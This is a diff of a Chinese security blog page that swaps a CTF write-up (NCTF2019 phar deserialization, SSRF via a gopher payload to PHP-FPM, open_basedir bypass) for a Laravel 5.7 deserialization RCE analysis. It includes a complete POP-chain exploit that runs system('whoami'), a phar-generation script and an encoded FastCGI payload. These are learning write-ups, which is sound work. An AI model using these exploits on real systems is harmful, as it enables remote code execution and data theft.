@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">[NCTF2019]phar matches everything | Troy3e</title>
+  <title itemprop="name">Laravel漏洞分析 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140593.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140593.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      [NCTF2019]phar matches everything</h1>
+      Laravel漏洞分析</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-4-9<span class="bull">
+        2021-4-17<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,167 +215,276 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>关键词：phar反序列化；ssrf打php-fpm</p>
-<p>WP本来不想发的，但是这道题BUU的环境有一些小变动。希望能帮到一些卡住的人。并且这道题也有很多值得学习的地方。</p>
-<p>github把源码down下来：</p>
-<pre><code>catchmine.php
-&lt;?php
-    class Easytest{
-       protected $test;
-        public function funny_get(){
-            return $this-&gt;test;
+          <p>又给自己挖了个大坑。。。</p>
+<h2 id="通过phpStudy搭建Laravel"><a href="#通过phpStudy搭建Laravel" class="headerlink" title="通过phpStudy搭建Laravel"></a>通过phpStudy搭建Laravel</h2><p>从github上把源码down下来：<a href="https://github.com/laravel/laravel/releases?after=v5.8.35" target="_blank" rel="noopener">https://github.com/laravel/laravel/releases?after=v5.8.35</a><br>然后在根目录打开cmd：composer intsall 生成vender目录<br>改hosts 路径：C:\Windows\System32\drivers\etc\hosts<br>添加127.0.0.1 <a href="http://www.fuck.com" target="_blank" rel="noopener">www.fuck.com</a>(Laravel必须由域名访问<br>最后把根目录下.env.example中的内容复制到.env中（记得localhost改成<a href="http://www.fuck.com），cmd中执行php" target="_blank" rel="noopener">www.fuck.com），cmd中执行php</a> artisan key:generate即可。<br>访问出现没有error就是搭建成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210417221038.png" alt><br>————————<br>后记：改hosts那一步可能不是必须的。</p>
+<h2 id="如何利用phpStorm进行动态调试"><a href="#如何利用phpStorm进行动态调试" class="headerlink" title="如何利用phpStorm进行动态调试"></a>如何利用phpStorm进行动态调试</h2><p>这一步是后面要用的，在进行代码审计时，通过调试进行分析是非常重要的，所以虽然有些小麻烦，但是必须会用。<br>需要的环境：phpStorm+Xdebug+phpStudy<br>phpStudy自带了xdebug插件，但是默认是关闭的，手动选择开启：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141556.png" alt></p>
+<p>更改配置文件，我这里用的是7.3.4nts</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141751.png" alt><br>只要改选中的部分，别的默认即可：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141902.png" alt><br>（这里我用9100端口是因为有时候9000会被占用，为了避免后面冲突的麻烦换成了和网上教程都不一样的9100）</p>
+<p>接下来 浏览器上下载Xdebug helper</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418142135.png" alt><br>在url栏后面的小虫。</p>
+<p>然后就是配置phpStorm</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143756.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143825.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143904.png" alt></p>
+<p>下断点 浏览器刷新：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418144030.png" alt><br>红点中打勾就说明已经成功断下来了。</p>
+<h2 id="Laravel-5-7-x-反序列化漏洞分析"><a href="#Laravel-5-7-x-反序列化漏洞分析" class="headerlink" title="Laravel 5.7.x 反序列化漏洞分析"></a>Laravel 5.7.x 反序列化漏洞分析</h2><p>laravel 5.7是一款基于php 7.1.3之上运行的优秀php开发框架,反序列化RCE漏洞出现在核心包中，但是需要对基于laravel v5.7框架进行二次开发的cms出现可控反序列化点，才能触发漏洞实现RCE。</p>
+<p>由于在本地搭建的仅仅是Laravel一个空架子，所以还需要手动添加一个反序列化点。<br>在routes\web.php增加一个路由:</p>
+<pre><code>Route::get(&#39;/index&#39;,&#39;TaskController@index&#39;);
+</code></pre><p>新建app\Http\Controllers\TaskController.php，并且在此增加反序列化入口：</p>
+<pre><code>&lt;?php
+namespace App\Http\Controllers;
+
+class TaskController
+{
+    public function index(){
+        if(isset($_GET[&#39;ser&#39;])){
+            $ser = $_GET[&#39;ser&#39;];
+            unserialize($ser);
+            return ;
+        }else{
+            echo &quot;no unserialization&quot;;
+            return ;
         }
     }
-    class Main {
-        public $url;
-        public function curl($url){
-            $ch = curl_init();  
-            curl_setopt($ch,CURLOPT_URL,$url);
-            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-            $output=curl_exec($ch);
-            curl_close($ch);
-            return $output;
+}
+?&gt;
+</code></pre><p>将Laravel 5.6和5.7版本进行对比，在vendor\laravel\framework\src\Illuminate\Foundation\Testing\下新版本多出了一个文件PendingCommand.php：<br>public$test;//一个实例化的类 Illuminate\Auth\GenericUser<br>protected$app;//一个实例化的类 Illuminate\Foundation\Application<br>protected$command;//要执行的php函数 system<br>protected$parameters;//要执行的php函数的参数  array(‘id’)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210417225934.png" alt><br>PendingCommand.php中run函数用来执行命令，而destruct中又调用了run函数。所以简单的 POP 链为：构造的 exp 经过反序列化后调用 __destruct()，进而调用 run(),run() 进行代码执行。</p>
+<p>现在通过exp来动态调试对利用链进行分析:<br>在执行unserialize后需要加载类，这里是通过src\Illuminate\Foundation\AliasLoader.php中load方法进行类的加载：</p>
+<p>桥豆麻袋，在这一步之前需要会用phpStorm进行动态调试，教程在上面。</p>
+<p>跟进unserialize：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418144310.png" alt></p>
+<p>static::$facadeNamespace是一个字符串常量：Facades\<br>来看下这是个什么东西：<br>Facades（读音：/fəˈsäd/ ）为应用程序的服务容器中可用的类提供了一个「静态」接口。Laravel 自带了很多 facades ，几乎可以用来访问到 Laravel 中所有的服务。Laravel facades 实际上是服务容器中那些底层类的「静态代理」，相比于传统的静态方法， facades 在提供了简洁且丰富的语法同时，还带来了更好的可测试性和扩展性。<br>Laravel 框架门面 Facade 源码分析：<a href="https://learnku.com/articles/4684/analysis-of-facade-source-code-of-laravel-frame" target="_blank" rel="noopener">https://learnku.com/articles/4684/analysis-of-facade-source-code-of-laravel-frame</a></p>
+<p>概括一下：门面相对于其他方法来说，最大的特点就是简洁。</p>
+<p>因此总结一下，此时加载ArrayInput类和Mockery类就会进行如下操作：</p>
+<p>1.需要加载的类是否为facede门面类，如果是则调用$this-&gt;loadFacade<br>2.Illuminate\Support\Facades命名空间来查找是否属于这些alias</p>
+<p>alias是类的别名，class_alias函数可以为任何类创建别名，而在Laravel启动后为各个门面类调用了class_alias函数，因此不必直接用类名，在config文件夹的app文件里面存放着门面与类名的映射.<br>Mockery类并非门面类，因此进入后面的if后通过loadClass方法调用findfile()函数通过classMap中定义的命名空间和对应类的地址的映射来获得所要加载类对应的类文件地址，找到类地址后通过includeFile来将该类进行包含：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419140404.png" alt></p>
+<p>到这Laravel加载类的方式应该也比较清楚了，到此完成了对整个利用类，也就是PendingCommand类的加载已经完成。</p>
+<p>下面进入该类的析构方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419141356.png" alt><br>这里hasExecuted默认为false，图片太长了没截到。<br>然后进入$this-&gt;run方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419141857.png" alt></p>
+<p>使用Mockery::mock实现对象的模拟：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419142223.png" alt></p>
+<p>这里涉及到类的加载，因此再次会调用load方法来加载类,回到load那里重复一遍，这里就直接跳过了。接着会调用$this-&gt;createABufferedOutputMock()方法，我们跟进该方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419194504.png" alt></p>
+<p>很明显如果这里expectedOutput不是数组的话就会立刻报错，利用链无法继续。所以全局找一下这个属性看看有没有可控的地方：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419195147.png" alt></p>
+<p>发现只有测试类有该属性。而测试类一般不会加载，那有何办法能够凭空创造expectedOutput属性呢？</p>
+<p>魔术方法。当类的成员属性被设定为private甚至是没有该成员属性时如果我们去获取这个不存在或者是私有属性，则会触发该类的__get()魔术方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419200615.png" alt></p>
+<p>能搜出来一堆，这里和网上文章一样选择//vendor\laravel\framework\src\Illuminate\Auth\GenericUser.php这里的。</p>
+<pre><code>class GenericUser implements UserContract
+{
+public function __construct(array $attributes)
+    {
+        $this-&gt;attributes = $attributes;
+    }
+public function __get($key)
+    {
+        return $this-&gt;attributes[$key];
+    }
+}
+</code></pre><p>只需要使得$this-&gt;test为GenericUser类，并且让attributes中存在键名为expectedOutput的数组，这样便可以跳出循环，使得利用链能够继续。<br>回到mockConsoleOutput():</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419201646.png" alt></p>
+<p>这里还有一个需要数组的地方，方法同上。</p>
+<p>接下来就到了利用链的关键处：</p>
+<pre><code>try {
+            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
+        } catch (NoMatchingExpectationException $e) {
+            if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) {
+                $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);
+            }
+
+            throw $e;
+        }
+</code></pre><p>来看后面的调用栈：<br>这里我没断到后面的调用栈，不知道是什么原因，偷图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419210850.png" alt></p>
+<p>————<br>后记：这里可能是要边调边显示的，调到后面就出来了。</p>
+<p>Kernel::class是一个定量，其值为Illuminate\Contracts\Console\Kernel这个类，我们持续跟进后几个调用栈：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211048.png" alt></p>
+<p>在进入make()方法,因为只有一个$key参数，所以第二个参数是空值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211443.png" alt></p>
+<p>再调用父类的make方法，此时parameters为空：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211712.png" alt></p>
+<p>跟进下面这个resolve方法：</p>
+<pre><code> /**
+     * Resolve the given type from the container.
+     *
+     * @param  string  $abstract
+     * @param  array  $parameters
+     * @return mixed
+     */
+    protected function resolve($abstract, $parameters = [])
+    {
+        $abstract = $this-&gt;getAlias($abstract);
+
+        $needsContextualBuild = ! empty($parameters) || ! is_null(
+            $this-&gt;getContextualConcrete($abstract)
+        );
+
+        // If an instance of the type is currently being managed as a singleton we&#39;ll
+        // just return an existing instance instead of instantiating new instances
+        // so the developer can keep using the same objects instance every time.
+        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) {
+            return $this-&gt;instances[$abstract];
         }
 
-        public function __destruct(){
-            $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);
-            if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){
-                echo $this-&gt;curl($this-&gt;url);
-           }
-        }    
-    }
+        $this-&gt;with[] = $parameters;
 
-    if(isset($_POST[&quot;submit&quot;])) {
-        $check = getimagesize($_POST[&#39;name&#39;]);
-       if($check !== false) {
-            echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
+        $concrete = $this-&gt;getConcrete($abstract);
+
+        // We&#39;re ready to instantiate an instance of the concrete type registered for
+        // the binding. This will instantiate the types, as well as resolve any of
+        // its &quot;nested&quot; dependencies recursively until all have gotten resolved.
+        if ($this-&gt;isBuildable($concrete, $abstract)) {
+            $object = $this-&gt;build($concrete);
         } else {
-            echo &quot;File is not an image.&quot;;
+            $object = $this-&gt;make($concrete);
+        }
+
+        // If we defined any extenders for this type, we&#39;ll need to spin through them
+        // and apply them to the object being built. This allows for the extension
+        // of services, such as changing configuration or decorating the object.
+        foreach ($this-&gt;getExtenders($abstract) as $extender) {
+            $object = $extender($object, $this);
+        }
+
+        // If the requested type is registered as a singleton we&#39;ll want to cache off
+        // the instances in &quot;memory&quot; so we can return it later without creating an
+        // entirely new instance of an object on each subsequent request for it.
+        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) {
+            $this-&gt;instances[$abstract] = $object;
+        }
+
+        $this-&gt;fireResolvingCallbacks($abstract, $object);
+
+        // Before returning, we will also set the resolved flag to &quot;true&quot; and pop off
+        // the parameter overrides for this build. After those two things are done
+        // we will be ready to return back the fully constructed class instance.
+        $this-&gt;resolved[$abstract] = true;
+
+        array_pop($this-&gt;with);
+
+        return $object;
+    }
+</code></pre><p>第一种思路：</p>
+<p>我们看到resolve方法中:</p>
+<pre><code>// namespace Illuminate\Container
+if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) {
+            return $this-&gt;instances[$abstract];
+        }
+</code></pre><p>如果我们可以控制$this-&gt;instances，那么我们将有可能返回一个任意对象，最终该对象会赋值给$this-&gt;app[Kernel::class]，在这里选取的是\Illuminate\Foundation\Application，该类同样继承自Containers,因此同样会进入该方法，此时$this就是Application这个实例，而我们想要返回的同样也是该类，因此我们需要做的是</p>
+<p>Application-&gt;instances[‘Illuminate\Contracts\Console\Kernel’] = Application</p>
+<p>至于为何选取Application在之后分析过程中也就明了了：</p>
+<p>分析到这我们可以先构造部分EXP:</p>
+<pre><code>&lt;?php
+namespace Illuminate\Foundation\Testing{
+//执行函数所在处
+    use PHPUnit\Framework\TestCase as PHPUnitTestCase;
+
+    class PendingCommand{
+        protected $app;
+        protected $command;
+        protected $parameters;
+        public $test;
+        public function __construct($test, $app, $command, $parameters)
+        {
+            $this-&gt;app = $app;
+            $this-&gt;test = $test;
+            $this-&gt;command = $command;
+            $this-&gt;parameters = $parameters;
+        }
+    }    
+}
+
+namespace Illuminate\Auth{
+//此处和下面一样都是触发get的，二选一即可
+    class GenericUser{
+        protected $attributes;
+        public function __construct(array $attributes)
+        {
+            $this-&gt;attributes = $attributes;
+        }
+        public function __get($key)
+        {
+            return $this-&gt;attributes[$key];
         }
     }
-    ?&gt;
-</code></pre><p>upload.php</p>
-<pre><code>&lt;?php
-$target_dir = &quot;uploads/&quot;;
-$uploadOk = 1;
-
-$imageFileType=substr($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],strrpos($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],&#39;.&#39;)+1,strlen($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]));
-
-$file_name = md5(time());
-$file_name =substr($file_name, 0, 10).&quot;.&quot;.$imageFileType;
-
-$target_file=$target_dir.$file_name;
-
-    $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);
-    if($check !== false) {
-        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
-        $uploadOk = 1;
-    } else {
-        echo &quot;File is not an image.&quot;;
-        $uploadOk = 0;
-    }
-
-
-if (file_exists($target_file)) {
-    echo &quot;Sorry, file already exists.&quot;;
-   $uploadOk = 0;
 }
-if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) {
-    echo &quot;Sorry, your file is too large.&quot;;
-    $uploadOk = 0;
-}
-if($imageFileType !== &quot;jpg&quot; &amp;&amp; $imageFileType !== &quot;png&quot; &amp;&amp; $imageFileType !== &quot;gif&quot; &amp;&amp; $imageFileType !== &quot;jpeg&quot;  ) {
-    echo &quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;;
-    $uploadOk = 0;
-}
-if ($uploadOk == 0) {
-    echo &quot;Sorry, your file was not uploaded.&quot;;
-} else {
-    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {
-        echo &quot;The file $file_name  has been uploaded to ./uploads/&quot;;
-    } else {
-        echo &quot;Sorry, there was an error uploading your file.&quot;;
+//__get方法也同样可以使用如下类
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($default = null)
+        {
+            $this-&gt;default = $default;
+        }
+        public function __get($attribute)
+        {
+            return $this-&gt;default;
+        }
     }
 }
-?&gt;
-</code></pre><p>catchmine.php里面有一个反序列化，先看这里。Main::curl()明显存在SSRF并且可使用文件流造成任意文件读取。但是要触发curl的话就没法控制main里面的url了，所以还需要上传个phar文件，在getimagesize处触发。<br>思路：第一次反序列化，在getimagesize处触发phar反序列化，从而控制url。第二次反序列化，执行curl。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210409003728.png" alt></p>
-<p>exp：（比较简单就不自己写了，来自guoke师傅</p>
-<pre><code>&lt;?php
-class Easytest{
-    protected $test=&#39;1&#39;;
+
+namespace Illuminate\Foundation{
+    class Application{
+        protected $instances = [];
+        public function __construct($instances = [])
+        {
+            $this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] = $instances;
+        }
+    }
 }
-class Main{
-    public $url=&#39;file:///proc/net/arp&#39;;
+
+namespace {
+    $genericuser = new Illuminate\Auth\GenericUser(
+        array(
+            //这里需要两次使用来循环获得以便成功跳过方法,两次键名分别为expectedOutput和expectedQuestions
+            &quot;expectedOutput&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;0&quot;),
+            &quot;expectedQuestions&quot;=&gt;array(&quot;crispr&quot;=&gt;&quot;1&quot;)
+        )
+    );
+    $app = new Illuminate\Foundation\Application();
+    //通过如下步骤最终获得的$this-&gt;app[Kernel::class]就是该Application实例
+    $application = new Illuminate\Foundation\Application($app);
+    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
+        $genericuser,
+        $application,
+        &quot;system&quot;,
+        array(&quot;whoami&quot;)
+   );
+    echo urlencode(serialize($pendingcommand));
 }
-$a=new Easytest();
-echo urlencode(serialize($a));
-$b=new Main();
-@unlink(&quot;phar.phar&quot;);
-$phar=new Phar(&quot;phar.phar&quot;);
-$phar-&gt;startBuffering(); 
-$phar-&gt;setStub(&#39;GIF89a&#39;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
-$phar-&gt;setMetadata($b); 
-$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
-$phar-&gt;stopBuffering();
-?&gt;
-</code></pre><p>第一个要注意的地方，这里etc/hosts没法读到内网ip，只能用/proc/net/arp<br>这里我读到的是10.0.199.2 然后具体哪个会回显PHP-FPM是要自己一个个试的 我试了3、4、5 都没有 然后直接试了11是可以的。</p>
-<p>那么php-fpm是啥呢？跟着p牛的博客学习一下：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<p>精简下内容方便查看：</p>
-<p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p>
-<p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
-<p>举个例子，用户访问<a href="http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</a></p>
-<pre><code>{
-&#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
-&#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
-&#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;,
-&#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;,
-&#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;,
-&#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;,
-&#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;,
-&#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
-&#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
-&#39;REMOTE_PORT&#39;: &#39;12345&#39;,
-&#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
-&#39;SERVER_PORT&#39;: &#39;80&#39;,
-&#39;SERVER_NAME&#39;: &quot;localhost&quot;,
-&#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;
-}
-</code></pre><p>这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
-<p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。</p>
-<p>Nginx（IIS7）解析漏洞：fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p>
-<p>在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions，只能以phpx结尾。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p>
-<p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
-<p>理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
-<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</p>
-<p>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</p>
-<p>那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p>
-<p>那么，我们怎么设置auto_prepend_file的值？</p>
-<p>这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
-<p>所以，我们最后传入如下环境变量：</p>
-<pre><code>{
-&#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
-&#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
-&#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;,
-&#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;,
-&#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;,
-&#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;,
-&#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;,
-&#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
-&#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
-&#39;REMOTE_PORT&#39;: &#39;12345&#39;,
-&#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
-&#39;SERVER_PORT&#39;: &#39;80&#39;,
-&#39;SERVER_NAME&#39;: &quot;localhost&quot;,
-&#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;
-&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,
-&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;
-}
-</code></pre><p>exp：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
-<p>最后构造gopher协议即可<br>payload：</p>
-<pre><code>gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00
-</code></pre><p>里面还有一个知识点，open_basedir的绕过和disable_function的限制。<br>四个执行函数都被ban了，用readfile代替即可。<br>open_basedir绕过的姿势网上有很多，这里我用的是通过chdir()和ini_set()来进行跨路径访问，网上找姿势的时候记得这里题目是php7，有些老版本的是不行的。<br>参考链接：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p>
-<p>好耶 学到许多</p>
+</code></pre><p>选择application类的理由：<br>此时的$this和instances均为application类，此时赋值给$this-&gt;app[Kernel::class]，在继续调用call方法时，由于application类没有call方法，根据特性会寻找其父类也就是Container类的call方法:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419215106.png" alt></p>
+<p>此时$callback为system而$parameters为whoami，继续跟进：、</p>
+<pre><code>public static function call($container, $callback, array $parameters = [], $defaultMethod = null)
+    {
+        if (static::isCallableWithAtSign($callback) || $defaultMethod) {
+            return static::callClass($container, $callback, $parameters, $defaultMethod);
+        }
+
+        return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {
+            return call_user_func_array(
+                $callback, static::getMethodDependencies($container, $callback, $parameters)
+            );
+        });
+    }
+</code></pre><p>此时$callback = system,判断是否进入isCallableWithAtSign:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419220228.png" alt></p>
+<p>显然无法满足，进入第二个分支：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419220542.png" alt></p>
+<p>可以看到getMethodDependencies方法只是将一个空数组和$parameters进行合并，合并后的数据依然是可控的，最终通过call_user_func_array(‘system’,array(‘whoami’))执行命令，这也是$parameters为数组的原因，因为call_user_func_array第二个参数要求是数组形式。</p>
+<p>第二种思路：</p>
+<p>没有进入该if语句，继续往下运行会进入getConcrete()方法，而其中的关键方法就是getConcrete()，我们在继续跟进:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419222846.png" alt></p>
+<p>看了后面思路与方法一大致相同 就不写了。</p>
+<p>复现思路：<a href="https://www.anquanke.com/post/id/230005" target="_blank" rel="noopener">https://www.anquanke.com/post/id/230005</a><br>总结：虽然还是不能完全看懂，但是对Laravel框架和此反序列化rce的执行流程有了基本的了解，以后熟练了必须再回来自己理一遍。</p>
 
         </div>
         <!-- .entry-content -->
